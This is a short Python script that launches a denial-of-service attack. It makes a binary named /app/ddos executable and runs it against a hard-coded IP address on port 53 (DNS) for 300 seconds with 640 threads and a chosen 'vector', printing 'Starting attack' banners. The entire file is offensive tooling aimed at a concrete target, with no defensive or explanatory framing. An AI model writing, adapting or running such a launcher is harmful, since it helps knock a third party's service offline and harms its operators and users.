#!/usr/bin/env python3
import os
import subprocess
import sys

# Configuration
BINARY = "/app/ddos"
TARGET_IP = "147.75.202.61"
TARGET_PORT = "53"
DURATION = "300"
THREADS = "640"
VECTOR = "2"

def attack():
    # Make binary executable
    os.system(f'chmod +x {BINARY}')
    
    # Check if binary exists
    if not os.path.exists(BINARY):
        print(f"Error: {BINARY} not found!")
        sys.exit(1)
    
    # Build command
    cmd = [BINARY, TARGET_IP, TARGET_PORT, DURATION, THREADS, VECTOR]
    
    print(f"🔥 Starting attack on {TARGET_IP}:{TARGET_PORT}")
    print(f"   Duration: {DURATION}s | Threads: {THREADS} | Vector: {VECTOR}")
    print(f"   Command: {' '.join(cmd)}")
    
    # Execute attack (foreground - output visible)
    subprocess.run(cmd)

if __name__ == "__main__":
    attack()
